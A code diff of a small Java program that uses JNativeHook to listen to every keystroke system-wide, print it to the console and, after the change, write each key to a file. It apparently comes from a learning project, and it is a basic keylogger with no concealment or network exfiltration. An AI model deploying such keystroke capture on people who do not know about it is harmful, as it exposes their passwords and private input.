@@ -12,15 +12,13 @@ import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
 /*
- * 
+ * Static myTXT class
  */
 import static my.file.myTXT.createFile;
 import static my.file.myTXT.writeFile;
 import static my.file.myTXT.currentDateTime;
 
 public class Main implements NativeKeyListener {
-
-    static private List<String> myList = new ArrayList<>();
 
     public static void main (String[] args) throws IOException {
         
@@ -35,7 +33,7 @@ public class Main implements NativeKeyListener {
         }
         GlobalScreen.addNativeKeyListener(new Main());
 
-        myTimer();
+        //myTimer();
     }
 
     @Override
@@ -47,10 +45,9 @@ public class Main implements NativeKeyListener {
         String keyString = nativeEvent.getKeyText(keyCode);
         System.out.println("Tecla pulsada (Código VK): " + keyCode);
         System.out.println("Letra: "+keyString);
-        myList.add(keyString);
-        
+        //myList.add(keyString);
         try {
-            writeFile(myList);
+            writeFile(keyString);
         } catch (IOException e) {
             e.printStackTrace();
         }
@@ -68,9 +65,6 @@ public class Main implements NativeKeyListener {
         while (i <= plus) {
             i++;
         }
-        //System.out.println(currentDateTime.getMinute());
-
-        //return actived;
     } 
 
 }
